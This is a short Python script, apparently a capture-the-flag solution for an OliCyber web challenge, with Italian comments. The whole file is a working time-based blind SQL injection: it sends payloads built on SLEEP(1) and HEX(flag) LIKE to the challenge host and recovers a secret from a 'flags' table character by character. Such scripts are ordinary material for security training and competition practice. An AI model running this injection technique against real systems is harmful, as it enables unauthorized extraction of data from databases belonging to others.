from injection import Inj
from time import time

inj = Inj('http://web-17.challs.olicyber.it/')

dictionary = '0123456789abcdef'
result = ''

while True:
    for c in dictionary:
        start = time()
        question = f"1' AND (SELECT SLEEP(1) FROM flags WHERE HEX(flag) LIKE '{result+c}%')='1"
        response, error = inj.time(question)
        stop = time()
        if stop - start > 1: # We have a match!
            print('ok')
            result += c
            break
    else:
        break # Yup, i cicli for in Python hanno una sezione else.
              # Significa che abbiamo esaurito i caratteri del
              # dizionario.
              
print(bytes.fromhex(result).decode("ASCII"))
